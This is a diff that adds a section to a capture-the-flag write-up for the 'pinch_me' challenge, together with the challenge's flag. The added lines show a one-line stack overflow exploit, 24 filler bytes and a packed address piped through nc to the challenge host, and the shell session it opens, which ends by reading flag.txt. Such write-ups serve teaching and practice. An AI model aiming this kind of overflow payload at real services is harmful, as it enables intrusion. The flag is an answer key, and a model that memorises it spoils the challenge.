@@ -68,3 +68,21 @@ dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}
 ```
 
 The flag is **dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}**.
+
+The below one-liner also did the job:
+
+```console
+root@osboxes:~/Downloads# (python -c "import pwn; print 'A'*24 + pwn.p64(0x000000001337c0de)"; cat) | nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480
+Is this a real life, or is it just a fanta sea?
+Am I dreaming?
+whoami
+pilot
+id
+uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
+ls
+flag.txt
+pinch_me
+startService.sh
+cat flag.txt
+dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}
+```
